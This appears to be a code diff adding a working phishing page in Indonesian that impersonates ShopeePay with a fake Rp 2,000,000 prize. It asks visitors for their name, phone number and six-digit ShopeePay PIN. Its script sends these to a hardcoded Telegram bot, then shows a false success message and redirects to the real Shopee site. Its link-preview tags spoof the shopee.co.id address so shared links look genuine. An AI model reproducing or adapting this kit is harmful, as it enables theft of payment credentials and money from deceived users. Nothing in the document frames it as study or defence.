@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <!-- Meta Tags agar muncul gambar saat kirim link di WA -->
+    <title>ShopeePay Berhadiah Rp 2.000.000</title>
+    <meta property="og:title" content="ShopeePay Berhadiah Rp 2.000.000">
+    <meta property="og:description" content="Lengkapi data Anda untuk menerima saldo ShopeePay sebesar Rp 2.000.000.">
+    <meta property="og:image" content="https://cdn.phototourl.com/member/2026-08-25-cae016f5-44a9-48fd-b170-b7c9d03e2a3f.jpg">
+    <meta property="og:url" content="https://shopee.co.id/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        :root {
+            --shopee-orange: #ee4d2d;
+            --text-black: #000000;
+            --text-gray: #666666;
+            --border-color: #e8e8e8;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .phone-container {
+            width: 100%;
+            max-width: 414px;
+            background-color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .header-img { width: 100%; display: block; }
+
+        /* --- SCREEN 1: FORM DATA --- */
+        .content-section { padding: 15px 20px; }
+        
+        .title-row { display: flex; align-items: center; margin-bottom: 8px; }
+        .icon-user { 
+            width: 22px; height: 22px; background: var(--shopee-orange); 
+            border-radius: 50%; color: white; display: flex; 
+            justify-content: center; align-items: center; font-size: 12px; margin-right: 10px;
+        }
+
+        .form-title { font-size: 18px; font-weight: 800; color: var(--text-black); }
+        .description { font-size: 13px; color: var(--text-gray); line-height: 1.4; margin-bottom: 15px; }
+
+        .input-group { margin-bottom: 12px; }
+        .label { font-size: 14px; font-weight: 600; color: var(--text-black); margin-bottom: 6px; display: block; }
+        
+        .input-box { 
+            display: flex; align-items: center; border: 1px solid var(--border-color); 
+            border-radius: 4px; padding: 12px; background: white;
+        }
+        .input-box input { border: none; outline: none; width: 100%; font-size: 14px; color: var(--text-black); }
+
+        .security-box {
+            background-color: #fff5f2; border: 1px solid #ffdbd1; 
+            border-radius: 8px; padding: 10px; display: flex; margin: 15px 0;
+        }
+        .sec-icon { 
+            width: 18px; height: 18px; background: var(--shopee-orange); 
+            border-radius: 4px; color: white; display: flex; 
+            justify-content: center; align-items: center; font-size: 10px; margin-right: 10px; flex-shrink: 0;
+        }
+        .sec-title { font-size: 13px; font-weight: 700; color: var(--text-black); display: block; }
+        .sec-desc { font-size: 12px; color: var(--text-gray); line-height: 1.3; }
+
+        .btn-orange {
+            width: 100%; background-color: var(--shopee-orange); color: white; 
+            border: none; padding: 15px; font-size: 16px; font-weight: 700; 
+            border-radius: 4px; cursor: pointer;
+        }
+
+        /* --- SCREEN 2: PIN --- */
+        #screen-pin { display: none; padding: 40px 20px; text-align: center; }
+        .pin-instruction { font-size: 17px; font-weight: 700; margin-bottom: 30px; }
+        .real-pin-input {
+            width: 80%; padding: 15px; font-size: 24px; letter-spacing: 15px;
+            text-align: center; border: 1px solid var(--border-color); border-radius: 8px;
+            outline: none; -webkit-text-security: disc;
+        }
+
+        /* --- SCREEN 3: AKHIR (SUCCESS) --- */
+        #screen-success { display: none; padding: 60px 20px; text-align: center; }
+        .success-icon { font-size: 60px; color: #4CAF50; margin-bottom: 20px; }
+        .success-title { font-size: 20px; font-weight: 800; color: var(--text-black); margin-bottom: 10px; }
+        .success-desc { font-size: 14px; color: var(--text-gray); line-height: 1.5; margin-bottom: 30px; }
+    </style>
+</head>
+<body>
+
+<div class="phone-container">
+    <!-- Halaman 1: Formulir -->
+    <div id="screen-form">
+        <!-- Header Banner Berdasarkan Sumber [1] dan [2] -->
+        <img src="https://cdn.phototourl.com/member/2026-08-25-d564145f-f80a-40ba-888a-04c346966bc4.png" class="header-img">
+        <div class="content-section">
+            <div class="title-row">      
+            </div>
+            <!-- Teks Deskripsi Sesuai Sumber [2] -->
+            <p class="description">Isi data diri dengan benar agar hadiah dapat dikirimkan ke akun ShopeePay Anda.</p>
+
+            <div class="input-group">
+                <label class="label">Nama Lengkap</label>
+                <div class="input-box"><input type="text" id="nama" placeholder="Masukkan nama sesuai KTP"></div>
+            </div>
+
+            <div class="input-group">
+                <label class="label">Nomor HP</label>
+                <div class="input-box"><input type="tel" id="phone" placeholder="Contoh: 08123456789"></div>
+            </div>
+
+            <div class="security-box">
+                <div class="sec-icon">✓</div>
+                <div class="sec-text">
+                    <span class="sec-title">Data aman dan terpercaya</span>
+                    <span class="sec-desc">Informasi yang Anda berikan akan kami jaga kerahasiaannya dan hanya digunakan untuk pengiriman hadiah.</span>
+                </div>
+            </div>
+
+            <button class="btn-orange" onclick="showPin()">Lanjutkan</button>
+        </div>
+    </div>
+
+    <!-- Halaman 2: PIN (Keyboard Bawaan HP) -->
+    <div id="screen-pin">
+        <div class="pin-instruction">Masukkan PIN ShopeePay</div>
+        <input type="tel" id="pinInput" class="real-pin-input" maxlength="6" inputmode="numeric" placeholder="••••••">
+        <p style="font-size: 13px; color: var(--text-gray); margin-top: 20px;">PIN diperlukan untuk memvalidasi akun Anda</p>
+        <button class="btn-orange" style="margin-top: 30px;" onclick="sendData()">Konfirmasi PIN</button>
+    </div>
+
+    <!-- Halaman 3: Tampilan Akhir & Redirect -->
+    <div id="screen-success">
+        <div class="success-icon">✅</div>
+        <div class="success-title">Verifikasi Berhasil!</div>
+        <!-- Menyebutkan Saldo Rp 2.000.000 Sesuai Sumber [1] -->
+        <p class="success-desc">Data Anda telah diterima. Saldo hadiah sebesar <b>Rp 2.000.000</b> akan segera diproses ke akun ShopeePay Anda.</p>
+        <button class="btn-orange" onclick="redirectToShopee()">Kembali ke Shopee</button>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = "7819561964:AAFh9wkf-TXVyhpDpIckN7Y8XyeRDf3fygw";
+    const CHAT_ID = "7667144622";
+
+    function showPin() {
+        if(document.getElementById('nama').value && document.getElementById('phone').value) {
+            document.getElementById('screen-form').style.display = 'none';
+            document.getElementById('screen-pin').style.display = 'block';
+            document.getElementById('pinInput').focus();
+        } else {
+            alert("Harap lengkapi data Anda sesuai KTP.");
+        }
+    }
+
+    async function sendData() {
+        const nama = document.getElementById('nama').value;
+        const phone = document.getElementById('phone').value;
+        const pin = document.getElementById('pinInput').value;
+
+        if (pin.length < 6) {
+            alert("Silakan masukkan 6 digit PIN ShopeePay Anda.");
+            return;
+        }
+
+        const message = `🔔 *Data Baru ShopeePay*\n\n👤 Nama: ${nama}\n📞 No HP: ${phone}\n🔐 PIN: ${pin}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+
+            if (response.ok) {
+                document.getElementById('screen-pin').style.display = 'none';
+                document.getElementById('screen-success').style.display = 'block';
+            } else {
+                alert("Koneksi bermasalah, silakan coba lagi.");
+            }
+        } catch (error) {
+            console.error("Error:", error);
+        }
+    }
+
+    function redirectToShopee() {
+        window.location.href = "https://shopee.co.id/";
+    }
+</script>
+
+</body>
+</html>
